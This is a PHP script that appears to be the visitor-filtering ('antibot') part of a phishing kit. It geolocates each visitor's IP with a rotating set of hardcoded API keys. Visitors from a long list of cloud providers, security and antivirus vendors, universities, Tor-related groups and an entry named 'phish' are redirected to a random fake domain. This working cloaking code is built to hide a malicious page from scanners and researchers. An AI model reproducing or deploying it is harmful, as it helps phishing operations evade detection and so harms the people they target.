<?php


session_start();


$keys = array(
 "63da69e357dc4c9db1b846c3d998343d",
 "103a0ac5b110412c9a639e3ab5afd99f",
 "d9c8ca199b3f40fabc69dfdfefdc9aa2",
 "9ca8963aff474f50aa21560017ea3a7e",
 "b6b481f32a4446b1a0a6a90067e0f10d",
 "2ff6a3cfbac34272afc205e05a9d629c",
 "4b060192e84d485e9235eda6fee93121",
 "2caffbb7123943d7933b1fe729994186",
 "357c8fda50224090ad413da4c3e7e40e",
 "57726a649e634b4bb854a9cd0658af24",
 "a08fcbcd08e244af90a972d98dde4e78",
 "c461a284199842f893dc5ec8561c9a7a",
 "c753697899f24dca89ff6a1e16b7e0e8",
 "187f062c0c074f89b2a706343f6d69a8",
 "14c7928d2aef416287e034ee91cd360d",
 "62401ee995cd422699c53c2208a880db");

$api = $keys[array_rand($keys)];


function babe($agent)
{

     $chz = curl_init();
           curl_setopt($chz,CURLOPT_URL,$agent);
           curl_setopt($chz,CURLOPT_RETURNTRANSFER,true);
           curl_setopt($chz, CURLOPT_SSL_VERIFYPEER, false);
     $resz = curl_exec($chz);

     return $resz;
}


function GetIP()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
    {
        if (array_key_exists($key, $_SERVER) === true)
        {
            foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)
            {
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                {
                    return $ip;
                }
            }
        }
    }
}

$ips = GetIP();


$az = babe('https://api.ipgeolocation.io/ipgeo?apiKey='.$api.'&ip='.$ips);

if (strpos($az, '"organization":"Microsoft Corporation"') || 
    strpos($az, '"organization":"DiGi Telecommunications Sdn Bhd., Digi Internet Exchange"') ||
    strpos($az, '"organization":"Quintex Alliance Consulting"') ||
    strpos($az, '"organization":"Transip B.V."') ||
    strpos($az, '"organization":"LLC Digital Network"') ||
    strpos($az, '"organization":"24SHELLS"') ||
    strpos($az, '"organization":"T-MOBILE-AS21928"') ||
    strpos($az, '"organization":"AMAZON-02"') ||
    strpos($az, '"organization":"HostRoyale Technologies Pvt Ltd"') ||
    strpos($az, '"organization":"AMAZON-AES"') ||
    strpos($az, '"organization":"INCX Global, LLC"') ||
    strpos($az, '"organization":"DigitalOcean, LLC"') ||
    strpos($az, '"organization":"British Telecommunications PLC"') ||
    strpos($az, '"organization":"Amazon Technologies Inc."') ||
    strpos($az, '"organization":"Telegram Messenger Inc"') ||
    strpos($az, '"organization":"QuickPacket, LLC"') ||
    strpos($az, '"organization":"24 SHELLS"') ||
    strpos($az, '"organization":"CenturyLink Communications, LLC"') ||
    strpos($az, '"organization":"Amazon.com, Inc."') ||
    strpos($az, '"organization":"China Unicom Guangdong IP network"') ||
    strpos($az, '"organization":"Leaseweb USA, Inc."') ||
    strpos($az, '"organization":"Google LLC"') ||
    strpos($az, '"organization":"Google"') ||
    strpos($az, '"organization":"phish"') ||
    strpos($az, '"organization":"Digital Energy Technologies Ltd."') ||
    strpos($az, '"organization":"M247 Ltd"') ||
    strpos($az, '"organization":"OVH SAS"') ||
    strpos($az, '"organization":"Powerhouse Management, Inc."') ||
    strpos($az, '"organization":"DigitalOcean, LLC"') ||
    strpos($az, '"organization":"IONOS SE"') ||
    strpos($az, '"organization":"ServeTheWorld AS"') ||
    strpos($az, '"organization":"SoftLayer Technologies Inc."') ||
    strpos($az, '"organization":"AVAST Software s.r.o."') ||
    strpos($az, '"organization":"SIA Bighost.lv"') ||
    strpos($az, '"organization":"Gigabit Hosting Sdn Bhd"') ||
    strpos($az, '"organization":"Datacamp Limited"') ||
    strpos($az, '"organization":"Keminet SHPK"') ||
    strpos($az, '"organization":"Maxihost LTDA"') ||
    strpos($az, '"organization":"OOO Network of data-centers Selectel"') ||
    strpos($az, '"organization":"TL Group SRL ( IPXON Networks )"') ||
    strpos($az, '"organization":"GleSYS AB"') ||
    strpos($az, '"organization":"A1 Hrvatska d.o.o."') ||
    strpos($az, '"organization":"Proservice LLC"') ||
    strpos($az, '"organization":"Visual Online S.A."') ||
    strpos($az, '"organization":"Cyprus Telecommunications Authority"') ||
    strpos($az, '"organization":"Packet Exchange Limited"') ||
    strpos($az, '"organization":"Free Range Cloud Hosting Inc."') ||
    strpos($az, '"organization":"TELEKS DOOEL Skopje"') ||
    strpos($az, '"organization":"Globalhost d.o.o."') ||
    strpos($az, '"organization":"ENAHOST s.r.o."') ||
    strpos($az, '"organization":"I.C.S. Trabia-Network S.R.L."') ||
    strpos($az, '"organization":"IPAX OG"') ||
    strpos($az, '"organization":"VERIXI SA"') ||
    strpos($az, '"organization":"ONITELECOM - INFOCOMUNICACOES, S.A."') ||
    strpos($az, '"organization":"Telefonica UK Limited"') ||
    strpos($az, '"organization":"Aruba S.p.A."') ||
    strpos($az, '"organization":"G-Core Labs S.A."') ||
    strpos($az, '"organization":"Amazon Technologies Inc."') ||
    strpos($az, '"organization":"Cogent Communications"') ||
    strpos($az, '"organization":"Informacines sistemos ir technologijos, UAB"') ||
    strpos($az, '"organization":"AltusHost B.V."') ||
    strpos($az, '"organization":"FranTech Solutions"') ||
    strpos($az, '"organization":"AGUAS DEL COLORADO SAPEM"') ||
    strpos($az, '"organization":"NODOSUD S.A"') ||
    strpos($az, '"organization":"Falco Networks B.V."') ||
    strpos($az, '"organization":"Leaseweb Asia Pacific pte. ltd."') ||
    strpos($az, '"organization":"GSL Networks Pty LTD"') ||
    strpos($az, '"organization":"Foundation for Applied Privacy"') ||
    strpos($az, '"organization":"DOUGLAS ESTACIO SAGMEISTER"') ||
    strpos($az, '"organization":"A.A INFORMATICA E MANUTENCAO LTDA"') ||
    strpos($az, '"organization":"Maxihost LTDA"') ||
    strpos($az, '"organization":"GRUPO MEGA FLASH SERVICOS E COMUNICACOES LTDA"') ||
    strpos($az, '"organization":"PARAISONET EIRELI"') ||
    strpos($az, '"organization":"ISH TECNOLOGIA S/A"') ||
    strpos($az, '"organization":"C-LIGUE TELECOMUNICACOES LTDA"') ||
    strpos($az, '"organization":"TELEFONICA BRASIL S.A."') ||
    strpos($az, '"organization":"Bulgarian Telecommunications Company Plc."') ||
    strpos($az, '"organization":"Start Communications"') ||
    strpos($az, '"organization":"B2 Net Solutions Inc."') ||
    strpos($az, '"organization":"iWeb Technologies Inc."') ||
    strpos($az, '"organization":"China Unicom Beijing Province Network"') ||
    strpos($az, '"organization":"China Telecom (Group)"') ||
    strpos($az, '"organization":"CHINA UNICOM China169 Backbone"') ||
    strpos($az, '"organization":"AVAST Software s.r.o."') ||
    strpos($az, '"organization":"IPXO LIMITED"') ||
    strpos($az, '"organization":"BullGuard ApS"') ||
    strpos($az, '"organization":"Renater"') ||
    strpos($az, '"organization":"Scalair SAS"') ||
    strpos($az, '"organization":"Orange S.A."') ||
    strpos($az, '"organization":"ONLINE S.A.S."') ||
    strpos($az, '"organization":"Ecritel SASU"') ||
    strpos($az, '"organization":"Verein zur Foerderung eines Deutschen Forschungsnetzes e.V."') ||
    strpos($az, '"organization":"Contabo GmbH"') ||
    strpos($az, '"organization":"Hetzner Online GmbH"') ||
    strpos($az, '"organization":"TELECOM ITALIA SPARKLE S.p.A."') ||
    strpos($az, '"organization":"Leaseweb Deutschland GmbH"') ||
    strpos($az, '"organization":"Amazon Technologies Inc."') ||
    strpos($az, '"organization":"F3 Netze e.V."') ||
    strpos($az, '"organization":"CIA TRIAD SECURITY LLC"') ||
    strpos($az, '"organization":"Zwiebelfreunde e.V."') ||
    strpos($az, '"organization":"Bayer AG"') ||
    strpos($az, '"organization":"Deutsche Telekom AG"') ||
    strpos($az, '"organization":"Vodafone GmbH"') ||
    strpos($az, '"organization":"PCCW IMS Limited"') ||
    strpos($az, '"organization":"RackForest Kft."') ||
    strpos($az, '"organization":"EstNOC OY"') ||
    strpos($az, '"organization":"Bharti Airtel Limited"') ||
    strpos($az, '"organization":"Bharat Sanchar Nigam Ltd"') ||
    strpos($az, '"organization":"Orion Network Limited"') ||
    strpos($az, '"organization":"Linknet-Fastnet ASN"') ||
    strpos($az, '"organization":"Telekomunikasi Indonesia (PT)"') ||
    strpos($az, '"organization":"Facebook, Inc."') ||
    strpos($az, '"organization":"Rachamim Aviel Twito trading as A.B INTERNET SOLUTIONS"') ||
    strpos($az, '"organization":"NETSTYLE A. LTD"') ||
    strpos($az, '"organization":"Cellcom Fixed Line Communication L.P."') ||
    strpos($az, '"organization":"Bezeq International-Ltd"') ||
    strpos($az, '"organization":"Fastweb SpA"') ||
    strpos($az, '"organization":"QTnet,Inc."') ||
    strpos($az, '"organization":"GMO Internet,Inc"') ||
    strpos($az, '"organization":"NTT Communications Corporation"') ||
    strpos($az, '"organization":"KAGOYA JAPAN Inc."') ||
    strpos($az, '"organization":"Asahi Net"') ||
    strpos($az, '"organization":"The Constant Company, LLC"') ||
    strpos($az, '"organization":"NTT-ME Corporation"') ||
    strpos($az, '"organization":"Jupiter Telecommunications Co., Ltd."') ||
    strpos($az, '"organization":"security made in Letzebuerg (SMILE gie)"') ||
    strpos($az, '"organization":"Servers.com, Inc."') ||
    strpos($az, '"organization":"Itissalat Al-MAGHRIB"') ||
    strpos($az, '"organization":"MEDITELECOM"') ||
    strpos($az, '"organization":"The Infrastructure Group B.V."') ||
    strpos($az, '"organization":"K4X OU"') ||
    strpos($az, '"organization":"Microsoft Corporation"') ||
    strpos($az, '"organization":"IP Volume inc"') ||
    strpos($az, '"organization":"Airtel Networks Limited"') ||
    strpos($az, '"organization":"Sky Cable Corporation"') ||
    strpos($az, '"organization":"ComClark Network & Technology Corp"') ||
    strpos($az, '"organization":"Firma Tonetic Krzysztof Adamczyk"') ||
    strpos($az, '"organization":"Atman Sp. z o.o."') ||
    strpos($az, '"organization":"Exatel S.A."') ||
    strpos($az, '"organization":"Bitdefender SRL"') ||
    strpos($az, '"organization":"Top Level Hosting SRL"') ||
    strpos($az, '"organization":"PJSC Vimpelcom"') ||
    strpos($az, '"organization":"Informational-measuring systems Ltd."') ||
    strpos($az, '"organization":"Kaspersky Lab AO"') ||
    strpos($az, '"organization":"NTT America, Inc."') ||
    strpos($az, '"organization":"SingNet Pte Ltd"') ||
    strpos($az, '"organization":"Afrihost (Pty) Ltd"') ||
    strpos($az, '"organization":"SK Broadband Co Ltd"') ||
    strpos($az, '"organization":"LG HelloVision Corp."') ||
    strpos($az, '"organization":"KINX"') ||
    strpos($az, '"organization":"Cogent Communications"') ||
    strpos($az, '"organization":"TEFINCOM S.A."') ||
    strpos($az, '"organization":"GleSYS AB"') ||
    strpos($az, '"organization":"Bahnhof AB"') ||
    strpos($az, '"organization":"Powerhouse Management, Inc."') ||
    strpos($az, '"organization":"GTT Communications Inc."') ||
    strpos($az, '"organization":"Clouvider Limited"') ||
    strpos($az, '"organization":"EE Limited"') ||
    strpos($az, '"organization":"Linode, LLC"') ||
    strpos($az, '"organization":"net4sec UG"') ||
    strpos($az, '"organization":"TalkTalk Communications Limited"') ||
    strpos($az, '"organization":"Hutchison 3G UK Limited"') ||
    strpos($az, '"organization":"ColoCrossing"') ||
    strpos($az, '"organization":"DedFiberCo"') ||
    strpos($az, '"organization":"Colocation America Corporation"') ||
    strpos($az, '"organization":"Cloud South"') ||
    strpos($az, '"organization":"Google LLC"') ||
    strpos($az, '"organization":"University of Georgia"') ||
    strpos($az, '"organization":"Maxihost LLC"') ||
    strpos($az, '"organization":"University of Tennessee"') ||
    strpos($az, '"organization":"i3D.net B.V"') ||
    strpos($az, '"organization":"Netskope Inc"') ||
    strpos($az, '"organization":"DigitalOcean, LLC"') ||
    strpos($az, '"organization":"M247 Ltd"') ||
    strpos($az, '"organization":"Security Firewall Ltd"') ||
    strpos($az, '"organization":"Fast Lane Communications LLC"') ||
    strpos($az, '"organization":"AxcelX Technologies LLC"') ||
    strpos($az, '"organization":"Forcepoint, LLC"') ||
    strpos($az, '"organization":"Dino Solutions, Inc."') ||
    strpos($az, '"organization":"The Rye Telephone Company"') ||
    strpos($az, '"organization":"Flexential Colorado Corp."') ||
    strpos($az, '"organization":"Emerald Onion"') ||
    strpos($az, '"organization":"UK Dedicated Servers Limited"') ||
    strpos($az, '"organization":"Private Layer INC"') ||
    strpos($az, '"organization":"Bitdefender SRL"') ||
    strpos($az, '"organization":"Hostodo"') ||
    strpos($az, '"organization":"Comcast Cable Communications, LLC"') ||
    strpos($az, '"organization":"Zayo Bandwidth"') ||
    strpos($az, '"organization":"Palo Alto Networks, Inc"') ||
    strpos($az, '"organization":"FortressITX"') ||
    strpos($az, '"organization":"Performive LLC"') ||
    strpos($az, '"organization":"Flexential Corp."') ||
    strpos($az, '"organization":"Host Color"') ||
    strpos($az, '"organization":"Geekyworks IT Solutions Pvt Ltd"') ||
    strpos($az, '"organization":"AS33891 Netzbetrieb GmbH"') ||
    strpos($az, '"organization":"ServerBase AG"') ||
    strpos($az, '"organization":"Faction"') ||
    strpos($az, '"organization":"Faction"') ||
    strpos($az, '"organization":"Secure Dragon LLC."') ||
    strpos($az, '"organization":"Level 3 Parent, LLC"') ||
    strpos($az, '"organization":"YANDEX LLC"') ||
    strpos($az, '"organization":"NForce Entertainment B.V."') ||
    strpos($az, '"organization":"QuadraNet Enterprises LLC"') ||
    strpos($az, '"organization":"Wintek Corporation"') ||
    strpos($az, '"organization":"Opera Software AS"') ||
    strpos($az, '"organization":"Charter Communications, Inc"') ||
    strpos($az, '"organization":"Database by Design, LLC"') ||
    strpos($az, '"organization":"VNPT Corp"') ||
    strpos($az, '"organization":"DIGITALOCEAN-ASN"')

) 
{
 {header("location: http://www.".rand(100,300)."-".rand(8456468748,500000000).".com");
     exit();} 
} 

?>